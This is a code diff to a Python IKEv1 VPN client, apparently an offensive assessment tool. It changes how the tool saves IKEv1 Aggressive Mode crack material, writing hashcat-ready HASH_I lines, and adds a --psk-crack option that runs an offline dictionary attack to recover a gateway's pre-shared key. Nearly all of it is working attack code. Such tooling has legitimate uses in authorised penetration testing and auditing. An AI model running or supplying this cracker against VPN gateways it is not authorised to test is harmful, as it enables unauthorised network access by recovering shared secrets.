@@ -1763,71 +1763,95 @@ class IKEv1Client:
     def _save_crack_material(self, path: str) -> None:
         """
         Write all key material needed to crack the PSK offline from an
-        IKEv1 Aggressive Mode capture.
+        IKEv1 Aggressive Mode exchange.
 
-        The responder's HASH_R is transmitted in the clear in message 2.
-        To crack it, a candidate PSK p is tested by computing:
-          SKEYID   = prf(p,        Ni || Nr)
-          HASH_R'  = prf(SKEYID,   g^xr || g^xi || CKY-R || CKY-I || SAi_b || IDir_b)
-        If HASH_R' == HASH_R then p is the correct PSK.
+        hashcat modes 5300 (MD5) and 5400 (SHA1) crack HASH_I — the
+        initiator's authentication hash — using the format:
+          g_xi:g_xr:cky_i:cky_r:sai_b:IDii_b:Ni:Nr:HASH_I
+
+        To crack, each candidate PSK p is tested by computing:
+          SKEYID  = prf(p,       Ni || Nr)
+          HASH_I' = prf(SKEYID,  g_xi || g_xr || cky_i || cky_r || sai_b || IDii_b)
+        If HASH_I' == HASH_I the PSK is found.
+
+        HASH_R (from message 2, always in the clear) is also stored in
+        the JSON for reference or use with other tools such as ike-scan's
+        psk-crack.
 
         Outputs:
-          <path>       — JSON file with all fields and the cracking formula
-          <path>.hc    — Single hashcat-compatible line (modes 5300 MD5 / 5400 SHA1)
+          <path>     — JSON with all fields and both cracking formulae
+          <path>.hc  — hashcat-ready line (modes 5300 MD5 / 5400 SHA1)
         """
-        hash_r   = getattr(self, "_pending_hash_r", None) or b""
-        sai_b    = self.sa_payload_bytes[4:]    # SA body: DOI | Situation | Proposal …
-        idir_b   = self.idr_payload_bytes[4:]   # ID body: type | reserved | value …
+        hash_r  = getattr(self, "_pending_hash_r", None) or b""
+        hash_i  = self._compute_hash_i()
+        sai_b   = self.sa_payload_bytes[4:]   # SA body: DOI | Situation | Proposal …
+        idii_b  = self.idi_payload_bytes[4:]  # IDii body: type | proto | port | value
+        idir_b  = self.idr_payload_bytes[4:]  # IDir body: type | proto | port | value
 
-        # hashcat mode: 5300 = IKE-PSK MD5, 5400 = IKE-PSK SHA1; others need custom scripts
+        # hashcat mode: 5300 = IKE-PSK MD5, 5400 = IKE-PSK SHA1
+        # NOTE: hashcat's IKE-PSK module has hardcoded buffer limits based on
+        # MODP-1024 (128-byte keys). DH groups >= 2048-bit will trigger a
+        # Salt-length exception. Use --psk-crack for any DH group.
         _hc_modes = {"md5": 5300, "sha1": 5400}
         hc_mode   = _hc_modes.get(self.cfg.hash_alg)
+        # hashcat's buffer supports up to 128-byte DH keys (MODP-1024 / group 2)
+        hc_usable = hc_mode is not None and self.cfg.dh_info.pub_key_len <= 128
         hc_note   = (
-            f"hashcat -m {hc_mode} <wordlist>"
+            f"hashcat -m {hc_mode} <FILE>.hc <wordlist>"
+            if hc_usable
+            else f"hashcat mode {hc_mode} not usable: DH key ({self.cfg.dh_info.pub_key_len}B) "
+                 f"exceeds hashcat's MODP-1024 buffer; "
+                 f"use: python ike_client.py --psk-crack <FILE>.json <wordlist>"
             if hc_mode
-            else f"No built-in hashcat mode for {self.cfg.hash_alg}; use john --format=IKE or a custom script"
+            else f"No built-in hashcat mode for {self.cfg.hash_alg}; "
+                 f"use: python ike_client.py --psk-crack <FILE>.json <wordlist>"
         )
-        # Standard hashcat IKE-PSK line: colon-separated hex fields
+
+        # Verified hashcat format (9 colon-separated hex fields):
+        # g_xi:g_xr:cky_i:cky_r:sai_b:IDii_b:Ni:Nr:HASH_I
         hc_line = ":".join([
-            self.cookie_i.hex(),
-            self.cookie_r.hex(),
-            self.nonce_i.hex(),
-            self.nonce_r.hex(),
             self.dh_pub.hex(),
             self.peer_dh_pub.hex(),
-            hash_r.hex(),
+            self.cookie_i.hex(),
+            self.cookie_r.hex(),
+            sai_b.hex(),
+            idii_b.hex(),
+            self.nonce_i.hex(),
+            self.nonce_r.hex(),
+            hash_i.hex(),
         ])
 
         record = {
-            "format_version": 1,
+            "format_version": 2,
             "exchange":       "IKEv1 Aggressive Mode PSK",
             "target":         f"{self.cfg.host}:{self.cfg.port}",
             "hash_algorithm": self.cfg.hash_alg,
             "fields": {
-                "cky_i":   self.cookie_i.hex(),
-                "cky_r":   self.cookie_r.hex(),
-                "nonce_i": self.nonce_i.hex(),
-                "nonce_r": self.nonce_r.hex(),
                 "g_xi":    self.dh_pub.hex(),
                 "g_xr":    self.peer_dh_pub.hex(),
+                "cky_i":   self.cookie_i.hex(),
+                "cky_r":   self.cookie_r.hex(),
                 "sai_b":   sai_b.hex(),
+                "idii_b":  idii_b.hex(),
                 "idir_b":  idir_b.hex(),
+                "nonce_i": self.nonce_i.hex(),
+                "nonce_r": self.nonce_r.hex(),
+                "hash_i":  hash_i.hex(),
                 "hash_r":  hash_r.hex(),
             },
             "crack_formula": {
-                "SKEYID":  "prf(PSK,    nonce_i || nonce_r)",
-                "HASH_R":  "prf(SKEYID, g_xr || g_xi || cky_r || cky_i || sai_b || idir_b)",
-                "check":   "PSK is correct when HASH_R_computed == hash_r",
                 "prf":     f"HMAC-{self.cfg.hash_alg.upper()}",
+                "SKEYID":  "prf(PSK,     nonce_i || nonce_r)",
+                "HASH_I":  "prf(SKEYID,  g_xi || g_xr || cky_i || cky_r || sai_b || idii_b)",
+                "HASH_R":  "prf(SKEYID,  g_xr || g_xi || cky_r || cky_i || sai_b || idir_b)",
+                "check":   "PSK is correct when computed value matches hash_i (hashcat) or hash_r (psk-crack)",
             },
             "hashcat": {
                 "mode":        hc_mode,
                 "description": f"IKE-PSK {self.cfg.hash_alg.upper()}",
+                "format":      "g_xi:g_xr:cky_i:cky_r:sai_b:IDii_b:Ni:Nr:HASH_I",
                 "line":        hc_line,
                 "usage":       hc_note,
-                "note":        "sai_b and idir_b are required for HASH_R computation "
-                               "but are not part of the standard hashcat line; "
-                               "they are stored above for use with custom scripts.",
             },
         }
 
@@ -1835,7 +1859,7 @@ class IKEv1Client:
         with open(path, "w") as fh:
             json.dump(record, fh, indent=2)
 
-        # Write bare hashcat line alongside the JSON
+        # Write bare hashcat line
         hc_path = path if path.endswith(".hc") else path + ".hc"
         with open(hc_path, "w") as fh:
             fh.write(hc_line + "\n")
@@ -1843,9 +1867,9 @@ class IKEv1Client:
         self.log.section("Aggressive Mode Crack Material")
         self.log.info(f"JSON file : {path}")
         self.log.info(f"Hashcat   : {hc_path}")
-        self.log.info(f"HASH_R    : {hash_r.hex()}")
+        self.log.info(f"HASH_I    : {hash_i.hex()}  (hashcat target)")
+        self.log.info(f"HASH_R    : {hash_r.hex()}  (wire, for psk-crack)")
         self.log.info(f"Hash alg  : {self.cfg.hash_alg.upper()}  ({hc_note})")
-        self.log.info(f"HC line   : {hc_line}")
 
     def _aggressive_mode(self) -> None:
         """Run the 3-message IKEv1 Aggressive Mode exchange (RFC 2409 §5.4)."""
@@ -2473,6 +2497,98 @@ def run_self_test() -> bool:
 
 
 # ---------------------------------------------------------------------------
+# Offline PSK cracker
+# ---------------------------------------------------------------------------
+
+def psk_crack(capture_path: str, wordlist_path: str) -> int:
+    """
+    Dictionary attack on an IKEv1 Aggressive Mode PSK using a JSON capture
+    file produced by --capture-file.
+
+    Tests each candidate PSK against both HASH_I and HASH_R from the capture.
+    Works for any DH group size (hashcat mode 5300/5400 is limited to MODP-1024).
+
+    Returns 0 on success (PSK found), 1 if not found, 2 on input error.
+    """
+    try:
+        with open(capture_path) as fh:
+            record = json.load(fh)
+    except (OSError, json.JSONDecodeError) as e:
+        print(f"[crack] Cannot read {capture_path}: {e}", file=sys.stderr)
+        return 2
+
+    fields = record.get("fields", {})
+    try:
+        g_xi   = bytes.fromhex(fields["g_xi"])
+        g_xr   = bytes.fromhex(fields["g_xr"])
+        cky_i  = bytes.fromhex(fields["cky_i"])
+        cky_r  = bytes.fromhex(fields["cky_r"])
+        ni     = bytes.fromhex(fields["nonce_i"])
+        nr     = bytes.fromhex(fields["nonce_r"])
+        sai_b  = bytes.fromhex(fields["sai_b"])
+        idii_b = bytes.fromhex(fields["idii_b"])
+        idir_b = bytes.fromhex(fields["idir_b"])
+        hash_i = bytes.fromhex(fields["hash_i"])
+        hash_r = bytes.fromhex(fields["hash_r"])
+    except (KeyError, ValueError) as e:
+        print(f"[crack] Missing or invalid field in capture: {e}", file=sys.stderr)
+        return 2
+
+    alg_name = record.get("hash_algorithm", "sha1").lower()
+    _alg_map = {"md5": "md5", "sha1": "sha1", "sha256": "sha256", "sha512": "sha512"}
+    hash_algo = _alg_map.get(alg_name)
+    if hash_algo is None:
+        print(f"[crack] Unknown hash algorithm: {alg_name!r}", file=sys.stderr)
+        return 2
+
+    def prf(key: bytes, data: bytes) -> bytes:
+        return _hmac.new(key, data, getattr(hashlib, hash_algo)).digest()
+
+    data_i = g_xi + g_xr + cky_i + cky_r + sai_b + idii_b  # HASH_I inputs
+    data_r = g_xr + g_xi + cky_r + cky_i + sai_b + idir_b  # HASH_R inputs
+
+    target = record.get("target", "unknown")
+    print(f"[crack] Target     : {target}")
+    print(f"[crack] Hash alg   : {alg_name.upper()}")
+    print(f"[crack] HASH_I     : {hash_i.hex()}")
+    print(f"[crack] HASH_R     : {hash_r.hex()}")
+    print(f"[crack] Wordlist   : {wordlist_path}")
+
+    tested  = 0
+    t_start = time.monotonic()
+
+    try:
+        with open(wordlist_path, "rb") as wl:
+            for raw in wl:
+                candidate = raw.rstrip(b"\r\n")
+                skeyid    = prf(candidate, ni + nr)
+                hi        = prf(skeyid, data_i)
+                if hi == hash_i:
+                    elapsed = time.monotonic() - t_start
+                    print(f"\n[crack] PSK FOUND (HASH_I match): {candidate.decode(errors='replace')!r}")
+                    print(f"[crack] Tested {tested+1:,} candidates in {elapsed:.2f}s")
+                    return 0
+                hr = prf(skeyid, data_r)
+                if hr == hash_r:
+                    elapsed = time.monotonic() - t_start
+                    print(f"\n[crack] PSK FOUND (HASH_R match): {candidate.decode(errors='replace')!r}")
+                    print(f"[crack] Tested {tested+1:,} candidates in {elapsed:.2f}s")
+                    return 0
+                tested += 1
+                if tested % 100_000 == 0:
+                    elapsed = time.monotonic() - t_start
+                    rate = tested / elapsed if elapsed else 0
+                    print(f"[crack] {tested:>10,} tested  ({rate:,.0f}/s) ...", end="\r", flush=True)
+    except OSError as e:
+        print(f"\n[crack] Cannot read wordlist: {e}", file=sys.stderr)
+        return 2
+
+    elapsed = time.monotonic() - t_start
+    print(f"\n[crack] Not found. Tested {tested:,} candidates in {elapsed:.2f}s")
+    return 1
+
+
+# ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
 
@@ -2556,6 +2672,10 @@ def build_parser() -> argparse.ArgumentParser:
                    help="Show hex dumps of all packets and crypto operations")
     p.add_argument("--self-test", action="store_true",
                    help="Run built-in crypto self-tests and exit")
+    p.add_argument("--psk-crack", nargs=2, metavar=("CAPTURE_JSON", "WORDLIST"),
+                   help="Offline PSK crack: read a --capture-file JSON and test "
+                        "every line in WORDLIST against HASH_I and HASH_R. "
+                        "Works for any DH group (hashcat is limited to MODP-1024).")
 
     return p
 
@@ -2567,6 +2687,9 @@ def main() -> None:
 
     if args.self_test:
         sys.exit(0 if run_self_test() else 1)
+
+    if args.psk_crack:
+        sys.exit(psk_crack(args.psk_crack[0], args.psk_crack[1]))
 
     if not args.host:
         parser.error("host is required unless --self-test is given")
